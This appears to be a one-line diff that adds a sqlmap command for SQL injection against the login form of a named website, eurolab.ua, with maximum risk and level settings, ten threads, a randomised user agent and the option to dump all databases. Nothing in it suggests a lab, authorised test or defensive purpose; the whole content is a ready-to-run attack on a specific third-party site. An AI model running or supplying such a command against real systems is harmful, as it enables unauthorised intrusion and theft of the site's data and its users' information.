@@ -1,0 +1,1 @@
+sqlmap  --random-agent --threads=10 --risk=3 --level=5 --dump-all --url="https://www.eurolab.ua/blog/login/" --data "email=admin&password=password" -p "email,password" --method POST
